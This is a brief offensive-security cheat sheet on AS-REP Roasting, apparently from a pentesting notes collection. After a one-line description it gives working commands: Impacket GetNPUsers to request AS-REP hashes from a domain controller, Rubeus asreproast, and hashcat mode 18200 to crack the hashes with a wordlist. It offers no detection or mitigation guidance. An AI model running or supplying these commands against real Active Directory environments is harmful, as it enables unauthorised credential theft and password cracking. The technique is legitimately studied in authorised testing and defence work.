# AS-REP Roasting

AS-REP Roasting dumps krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.

**Impacket**

```sh
impacket-GetNPUsers.py pwnlab.local/user:password -dc-ip 192.168.x.x -request
```

**Rubeus**

```sh
C:\User\Administrator> Rubeus.exe asreproast
```

```sh
hashcat -m 18200 hash.txt Pass.txt
```
